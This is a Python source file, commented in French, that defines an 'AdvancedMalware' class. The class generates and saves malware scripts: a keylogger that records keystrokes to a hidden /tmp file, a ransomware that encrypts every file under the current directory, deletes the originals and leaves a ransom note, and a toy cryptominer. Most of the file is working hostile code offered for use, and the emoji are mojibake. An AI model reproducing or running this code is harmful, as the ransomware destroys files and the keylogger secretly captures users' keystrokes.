#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ü¶† ADVANCED MALWARE - Module de malware avanc√©
RAT, keylogger, ransomware, cryptominer
"""

import os
import subprocess
import threading
import time
import json
import base64
import random
import string
from datetime import datetime

class AdvancedMalware:
    def __init__(self):
        self.malware_samples = []
        self.active_malware = []
        
    def create_keylogger(self, target_os):
        """Cr√©e un keylogger"""
        print(f"‚å®Ô∏è Cr√©ation keylogger: {target_os}")
        
        try:
            malware_dir = "malware"
            os.makedirs(malware_dir, exist_ok=True)
            
            keylogger_name = f"keylogger_{target_os}_{int(time.time())}"
            keylogger_file = os.path.join(malware_dir, f"{keylogger_name}.py")
            
            keylogger_code = f'''#!/usr/bin/env python3
import pynput
from pynput.keyboard import Key, Listener
import threading
import time
import os

class Keylogger:
    def __init__(self):
        self.log_file = "/tmp/.system_log"
        self.keys = []
        
    def on_press(self, key):
        try:
            self.keys.append(str(key))
            if len(self.keys) > 10:
                with open(self.log_file, 'a') as f:
                    f.write(''.join(self.keys) + '\\n')
                self.keys = []
        except:
            pass
            
    def start(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()
'''
            
            with open(keylogger_file, 'w', encoding='utf-8') as f:
                f.write(keylogger_code)
            
            malware_info = {
                'name': keylogger_name,
                'target_os': target_os,
                'file': keylogger_file,
                'timestamp': datetime.now().isoformat(),
                'type': 'keylogger'
            }
            
            self.malware_samples.append(malware_info)
            print(f"‚úÖ Keylogger cr√©√©: {keylogger_file}")
            return keylogger_file
            
        except Exception as e:
            print(f"‚ùå Erreur cr√©ation keylogger: {e}")
            return None
    
    def create_ransomware(self, target_os):
        """Cr√©e un ransomware basique"""
        print(f"üîí Cr√©ation ransomware: {target_os}")
        
        try:
            malware_dir = "malware"
            os.makedirs(malware_dir, exist_ok=True)
            
            ransomware_name = f"ransomware_{target_os}_{int(time.time())}"
            ransomware_file = os.path.join(malware_dir, f"{ransomware_name}.py")
            
            ransomware_code = f'''#!/usr/bin/env python3
import os
import base64
import random
import string
from cryptography.fernet import Fernet

class Ransomware:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.extension = ".encrypted"
        
    def encrypt_file(self, file_path):
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            encrypted_data = self.cipher.encrypt(data)
            with open(file_path + self.extension, 'wb') as f:
                f.write(encrypted_data)
            os.remove(file_path)
        except:
            pass
            
    def encrypt_directory(self, directory):
        for root, dirs, files in os.walk(directory):
            for file in files:
                if not file.endswith(self.extension):
                    file_path = os.path.join(root, file)
                    self.encrypt_file(file_path)
                    
    def create_ransom_note(self):
        note = f"""
üîí VOS FICHIERS ONT √âT√â CHIFFR√âS

Cl√© de d√©chiffrement: {self.key.decode()}

Pour r√©cup√©rer vos fichiers, contactez-nous.
"""
        with open("RANSOM_NOTE.txt", 'w') as f:
            f.write(note)

if __name__ == "__main__":
    ransomware = Ransomware()
    ransomware.encrypt_directory(".")
    ransomware.create_ransom_note()
'''
            
            with open(ransomware_file, 'w', encoding='utf-8') as f:
                f.write(ransomware_code)
            
            malware_info = {
                'name': ransomware_name,
                'target_os': target_os,
                'file': ransomware_file,
                'timestamp': datetime.now().isoformat(),
                'type': 'ransomware'
            }
            
            self.malware_samples.append(malware_info)
            print(f"‚úÖ Ransomware cr√©√©: {ransomware_file}")
            return ransomware_file
            
        except Exception as e:
            print(f"‚ùå Erreur cr√©ation ransomware: {e}")
            return None
    
    def create_cryptominer(self, target_os):
        """Cr√©e un cryptominer"""
        print(f"‚õèÔ∏è Cr√©ation cryptominer: {target_os}")
        
        try:
            malware_dir = "malware"
            os.makedirs(malware_dir, exist_ok=True)
            
            miner_name = f"cryptominer_{target_os}_{int(time.time())}"
            miner_file = os.path.join(malware_dir, f"{miner_name}.py")
            
            miner_code = f'''#!/usr/bin/env python3
import hashlib
import threading
import time
import random

class Cryptominer:
    def __init__(self):
        self.wallet = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
        self.difficulty = 4
        self.nonce = 0
        
    def mine_block(self):
        while True:
            data = f"block{{self.nonce}}"
            hash_result = hashlib.sha256(data.encode()).hexdigest()
            
            if hash_result.startswith('0' * self.difficulty):
                print(f"Block trouv√©: {{hash_result}}")
                break
                
            self.nonce += 1
            
    def start_mining(self):
        threads = []
        for _ in range(4):  # 4 threads
            t = threading.Thread(target=self.mine_block)
            t.daemon = True
            t.start()
            threads.append(t)
            
        for t in threads:
            t.join()

if __name__ == "__main__":
    miner = Cryptominer()
    miner.start_mining()
'''
            
            with open(miner_file, 'w', encoding='utf-8') as f:
                f.write(miner_code)
            
            malware_info = {
                'name': miner_name,
                'target_os': target_os,
                'file': miner_file,
                'timestamp': datetime.now().isoformat(),
                'type': 'cryptominer'
            }
            
            self.malware_samples.append(malware_info)
            print(f"‚úÖ Cryptominer cr√©√©: {miner_file}")
            return miner_file
            
        except Exception as e:
            print(f"‚ùå Erreur cr√©ation cryptominer: {e}")
            return None 